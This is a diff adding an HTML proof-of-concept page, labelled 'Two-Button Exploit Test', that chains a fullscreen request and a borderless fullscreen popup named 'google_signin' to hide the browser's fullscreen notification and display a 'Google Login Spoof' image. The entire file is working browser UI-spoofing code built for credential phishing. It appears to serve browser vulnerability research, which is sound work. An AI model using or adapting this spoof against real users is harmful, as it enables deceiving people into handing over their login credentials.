@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, user-scalable=no" />
+    <title>URL TESTING WEBVIEW - Two Button Method</title>
+    <style>
+      body,
+      html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        width: 100%;
+        overflow: hidden;
+        background: #fff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+      
+      /* Container untuk overlap buttons */
+      .button-container {
+        position: relative;
+        width: 400px;
+        height: 60px;
+      }
+      
+      /* Base button style */
+      .signin-btn {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        padding: 20px 40px;
+        background: #4285f4;
+        color: white;
+        font-size: 18px;
+        font-family: Arial, sans-serif;
+        text-decoration: none;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        transition: background 0.3s ease;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      
+      .signin-btn:hover {
+        background: #3367d6;
+      }
+      
+      /* Button 1 - Fullscreen (Initially visible) */
+      #btn-fullscreen {
+        z-index: 2;
+        opacity: 1;
+        visibility: visible;
+      }
+      
+      /* Button 2 - Popup (Initially hidden behind) */
+      #btn-popup {
+        z-index: 1;
+        opacity: 0;
+        visibility: hidden;
+      }
+      
+      /* When button 1 is clicked, hide it and show button 2 */
+      #btn-fullscreen.hidden {
+        opacity: 0;
+        visibility: hidden;
+        pointer-events: none;
+        transition: opacity 0.3s ease, visibility 0s 0.3s;
+      }
+      
+      #btn-popup.visible {
+        z-index: 2;
+        opacity: 1;
+        visibility: visible;
+        transition: opacity 0.3s ease;
+      }
+      
+      /* Spoof image - hidden initially */
+      #spoof-img {
+        display: none;
+        max-width: 100%;
+        max-height: 100%;
+        object-fit: contain;
+        position: absolute;
+        top: 0;
+        left: 0;
+        z-index: 1;
+      }
+      
+      /* Instructions text */
+      .instructions {
+        position: absolute;
+        top: 20px;
+        left: 20px;
+        background: rgba(0, 0, 0, 0.8);
+        color: white;
+        padding: 15px;
+        border-radius: 8px;
+        font-family: Arial, sans-serif;
+        font-size: 14px;
+        max-width: 500px;
+        z-index: 10;
+      }
+      
+      .instructions h3 {
+        margin: 0 0 10px 0;
+        font-size: 16px;
+      }
+      
+      .instructions ol {
+        margin: 10px 0;
+        padding-left: 20px;
+      }
+      
+      .instructions li {
+        margin: 5px 0;
+      }
+    </style>
+    <script>
+      let fullscreenActivated = false;
+      
+      // Function 1: Enter Fullscreen (Button 1)
+      function enterFullscreen() {
+        console.log("Button 1 clicked: Entering fullscreen...");
+        
+        // Request fullscreen
+        var elem = document.documentElement;
+        if (elem.requestFullscreen) {
+          elem.requestFullscreen();
+        } else if (elem.webkitRequestFullscreen) {
+          elem.webkitRequestFullscreen();
+        } else if (elem.mozRequestFullScreen) {
+          elem.mozRequestFullScreen();
+        } else if (elem.msRequestFullscreen) {
+          elem.msRequestFullscreen();
+        }
+        
+        // Mark that fullscreen is activated
+        fullscreenActivated = true;
+        
+        // Hide button 1 and show button 2
+        document.getElementById("btn-fullscreen").classList.add("hidden");
+        
+        // Small delay to ensure fullscreen is active, then show button 2
+        setTimeout(function() {
+          document.getElementById("btn-popup").classList.add("visible");
+          console.log("Button 2 is now visible. Click it to open popup.");
+        }, 300);
+      }
+      
+      // Function 2: Open Popup Window (Button 2)
+      function openPopup() {
+        console.log("Button 2 clicked: Opening popup window...");
+        
+        // Check if fullscreen is active
+        if (!fullscreenActivated) {
+          alert("Please click Button 1 first to enter fullscreen!");
+          return;
+        }
+        
+        // Open popup window with full screen dimensions
+        var params =
+          "width=" +
+          screen.width +
+          ",height=" +
+          screen.height +
+          ",top=0,left=0" +
+          ",menubar=no,toolbar=no,location=no,status=no,scrollbars=no,resizable=no";
+
+        var win = window.open("opener.html", "google_signin", params);
+        
+        if (win) {
+          win.moveTo(0, 0);
+          win.resizeTo(screen.width, screen.height);
+          console.log("Popup opened successfully!");
+          
+          // IMPORTANT: Do NOT call win.focus()
+          // Keep focus on main window to maintain fullscreen
+        }
+
+        // Display spoof image immediately
+        document.getElementById("spoof-img").style.display = "block";
+        console.log("Spoof UI displayed");
+
+        // Hide button 2 after popup opens
+        setTimeout(function () {
+          document.getElementById("btn-popup").classList.remove("visible");
+          document.querySelector(".instructions").style.display = "none";
+          console.log("Exploit complete. Popup covers fullscreen notification.");
+        }, 500);
+
+        // Keep focus on main window (critical for exploit)
+        window.focus();
+      }
+      
+      // Monitor fullscreen changes
+      document.addEventListener('fullscreenchange', function() {
+        if (document.fullscreenElement) {
+          console.log("✓ Fullscreen activated");
+        } else {
+          console.log("✗ Fullscreen exited");
+          fullscreenActivated = false;
+          
+          // Reset UI if user exits fullscreen
+          document.getElementById("btn-fullscreen").classList.remove("hidden");
+          document.getElementById("btn-popup").classList.remove("visible");
+          document.getElementById("spoof-img").style.display = "none";
+        }
+      });
+    </script>
+  </head>
+  <body>
+    <!-- Instructions -->
+    <div class="instructions">
+      <h3>🔬 Two-Button Exploit Test</h3>
+      <ol>
+        <li><strong>Click Button 1:</strong> Activates fullscreen mode</li>
+        <li><strong>Click Button 2:</strong> Opens popup (same position)</li>
+        <li><strong>Wait 2 seconds</strong> before closing popup</li>
+        <li><strong>Observe:</strong> Popup covers fullscreen notification</li>
+      </ol>
+      <p><strong>Note:</strong> Both buttons are at the same position. Button 2 appears after clicking Button 1.</p>
+    </div>
+    
+    <!-- Button Container - Both buttons overlap exactly -->
+    <div class="button-container">
+      <!-- Button 1: Fullscreen (Initially visible, z-index: 2) -->
+      <button id="btn-fullscreen" class="signin-btn" onclick="enterFullscreen()">
+        Step 1: Click here to enter Fullscreen
+      </button>
+      
+      <!-- Button 2: Popup (Initially hidden behind, z-index: 1) -->
+      <button id="btn-popup" class="signin-btn" onclick="openPopup()">
+        Step 2: Click here to open Popup Window
+      </button>
+    </div>
+
+    <!-- Spoof image - displayed after popup opens -->
+    <img id="spoof-img" src="spoof.png" alt="Google Login Spoof" />
+  </body>
+</html>
